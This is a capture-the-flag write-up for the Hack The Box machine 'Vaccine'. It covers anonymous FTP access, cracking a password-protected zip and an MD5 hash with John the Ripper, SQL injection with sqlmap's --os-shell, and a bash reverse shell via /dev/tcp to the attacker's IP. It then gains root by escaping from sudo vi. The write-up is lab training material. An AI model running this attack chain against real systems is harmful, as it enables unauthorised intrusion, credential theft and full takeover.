# Vaccine HTB Writeup

Today we will be pwning the htb machine "vaccine." 
# Reconnaissance
Per usual, we will be running an nmap scan with the flag -sV to tell nmap to return information about the services running on the open ports it discovers.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_11_43_19.png?raw=true)

```bash
nmap -sV [machine-ip]
```
After running the nmap scan, we see that there is 3 open ports running on the machine. Them being an FTP server, an SSH server and an Apache webserver meaning this machine also has some form of website being hosted on it. From here we are going to attempt to login to the FTP server (file transfer protocol) as if it has been misconfigured we could potentially login without needing a password.

![So yeah dis it](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_11_56_37.png?raw=true)

```bash
ftp [target-ip]
```
Using the username `anonymous` we can successfully login to the server without needing any other credentials (see image).
By running the command `ls` (or `dir`) we can see the files and directories in our local directory. The only file returned by this command is named backup.zip so we download it with the command `get backup.zip`. From there, we can exit the ftp server

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_12_02_03.png?raw=true)
Now we can attempt to unzip this file with the command `unzip [file]`.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_12_03_29.png?raw=true)

The archive is protected by a password so we are prompted by unzip to enter the password for the file to allow us to extract its data. Unfortunately, we do not know this password. So we must go for a slightly different approach...

We will have to bruteforce the zip's password. To do this we will use the tool "John the Ripper
```
John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems. **John the Ripper jumbo** supports hundreds of hash and cipher types, including for: user passwords of Unix flavors (Linux, *BSD, Solaris, AIX, QNX, etc.), macOS, Windows, "web apps" (e.g., WordPress), groupware (e.g., Notes/Domino), and database servers (SQL, LDAP, etc.); network traffic captures (Windows network authentication, WiFi WPA-PSK, etc.); encrypted private keys (SSH, GnuPG, cryptocurrency wallets, etc.), filesystems and disks (macOS .dmg files and "sparse bundles", Windows BitLocker, etc.), archives (ZIP, RAR, 7z), and document files (PDF, Microsoft Office's, etc.) These are just some of the examples - there are many more.
```
To do this, we first must install john the ripper, if you are on Kali Linux then run `sudo apt install john -y`. If you are on another distro please refer to their [github page](https://github.com/openwall/john). 

Once you have installed John, use `zip2john` to convert the zip archive into a crack-able hash.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_12_07_57.png?raw=true)

```bash
zip2john backup.zip > hash
```
Please note for the next part you need to have the rockyou wordlist installed (check out https://github.com/danielmiessler/SecLists).
Now we'll type the following command to crack the password for the file (make sure to add the path to your wordlist): 
`john -wordlist=/path/to/the/wordlist/rockyou.txt hash`

This command will load the wordlist and attempt to bruteforce the zip archives' password (output shown in image is different to what you will see, its just because I've already cracked the pass). Then use the command `john --show hash` to view the cracked password. 

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_13_41_48.png?raw=true)

As you can see, the password for the zip archive is `741852963`, now we can unzip the file and check out its contents.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_13_46_07.png?raw=true)

After unzipping, we can see the zip was made out of an index.php file and a style.css file. Run `cat index.php` to view the file's contents.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_13_47_37.png?raw=true)

As you can see, the admin accounts credentials are stored at the top of the php file (`admin:2cb42f8734ea607eefed3b70af13bbd3`). However, the password seems to resemble some sort of hash, so we must crack it using John.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_13_50_18.png?raw=true)

The command `hashid [hash]` returns many potential types of hash it could be however we are going to try MD5 first as it is very commonly used.

First we've had to add the hash to a file using `echo '2cb42f8734ea607eefed3b70af13bbd3' > pass` and now we can get bruteforcing!

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_14_17_28.png?raw=true)
```bash
john --format=raw-md5 --wordlist=/path/to/wordlist/rockyou.txt filewithhash
```

Now, once John has finished bruteforcing, we can see that the password is `qwerty789`. From here, we will open the website being hosted on the machine in our browser, revealing a login page.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_14_19_43.png?raw=true)

By supplying the username and password we cracked, we can log in to the website and we are now logged in to an admin panel!

The dashboard seems to have nothing special in it except for a search bar which could potentially be linked to a database. When we search for something, the $search variable is used in the URL to fetch stuff from the database. This website may be vulnerable to SQL injection attacks. We could do this manually but why not use another little toy called SQLmap.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_14_25_17.png?raw=true)

Now, we must install SQLmap with the command
`sudo apt install sqlmap -y`
To test this website we need to give the following parameters - the url and the cookie (required for authentication)
To grab this coookie we must intercept any request from the website with BurpSuite, however you can also use the extension cookie-editor. For efficiency purposes, I will be using the extension in this case, you can install it [here](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm) for Chrome and [here](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) for Firefox.

Now whilst on the dashboard, run the extension.
The format HTTP messages of requests are usually sent in this way:
`PHPSESSID=[cookie-from-ext]`
Now that we know the syntax, we can use SQLmap to find any SQL injection vulnerabilities. 

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_14_45_15.png?raw=true)

```bash
sqlmap -u 'http://[target-ip]/dashboard.php?search=query' --cookie="PHPSESSID=[your-cookie]"
```
Out of all this jumble, the most important thing to be able to quickly recognise vulnerabilities are the prompts, (answer yes to all). In this case, the prompt `GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)?  
[y/N]` simply tells us the website is vulnerable.

SQLmap confirmed that the target is vulnerable to SQL injectio. Now we will rerun SQLmap but with the  --os-shell flag, where we will be able  to perform command injection.

```bash
sqlmap -u 'http://[target-ip]/dashboard.php?search=query' --cookie="PHPSESSID=[your-cookie]" --os-shell
```
After running this command, please open up a new terminal tab and start a netcat listener with `sudo nc -lvnp 443`.
Then, on the terminal running SQLmap run the payload:
```bash
bash -c "bash -i >& /dev/tcp/[your-tun0-IP]/443 0>&1"
```
Now, go back listener and you should be connected to the machine!
The userflag is located in `/var/lib/postgresql/`:

```bash
your@terminal:~$ cd /var/lib/postgresql
your@terminal:~$ ls  
user.txt  
your@terminal:~$ cat user.txt
NO CHEATING, DO IT YOURSELF
your@terminal:~$
```

# Privilege Escalation 

We are currently the user `postgres`,  however we do not know the password for the account meaning we cannot execute commands that require root privileges.
Since the machine uses both PHP and SQL we could attempt to find the passwords in clear text. The first place to check is `/var/www/html`.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_20_07_15.png?raw=true)

Enter the directory and then run `grep "pass" dashboard.txt
By using grep, we can search the files in that directory for specific keywords. In this case, I used the keyword pass to find any occurrences of the word in `dashboard.php`. Fortunately, there was, and it is the password for the user (`P@s5w0rd!`) we are currently logged into (`postgres`). 
Due to the instability of the shell we are currently in, we will now login to the machine via SSH (using the password we found).

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_20_09_14.png?raw=true)

```ssh postgres@[target-ip]```

Now, we will type `sudo -l` again to see what privileges we have.

We have sudo privileges to edit the `pg_hba.conf` file using vi by running `sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
To do this, we must first enter vi via
`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`.  This opens vi as root.

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_20_14_15.png?raw=true)

Now, type `:set shell=/bin/sh`

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_20_14_48.png?raw=true)

Now, we can type `:shell`, this command should then load a shell which if we run `whoami` tells us we are root!

![enter image description here](https://github.com/7ud/writeups/blob/main/HTB/images/VirtualBox_kali-linux-2022.3-virtualbox-amd64_24_10_2022_20_16_15.png?raw=true)

Now, we have root but we do not know where the flag is stored. After a bit of digging, we find the flag to be stored in `/root`. Finally, cd into `/root` , run `ls` to show the files in the directory and run `cat root.txt`  to view the flag!
